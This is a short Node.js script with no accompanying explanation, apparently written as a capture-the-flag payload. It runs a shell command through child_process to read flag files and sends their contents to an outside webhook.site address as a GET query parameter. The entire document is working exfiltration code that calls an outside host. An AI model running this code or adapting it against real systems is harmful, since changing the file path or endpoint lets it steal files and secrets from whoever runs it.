const { exec } = require('child_process');
const http = require('http');
const https = require('https');
const endpoint = 'https://webhook.site/12345678-1234-1234-1234-123456789abc';

exec('cat /flag* 2>/dev/null || cat flag.txt 2>/dev/null', (_error, output) => {
  const send = (url) => {
    const client = url.startsWith('https') ? https : http;
    client.get(url + '?d=' + encodeURIComponent(output || 'no-flag')).on('error', () => {});
  };
  send(endpoint);
});
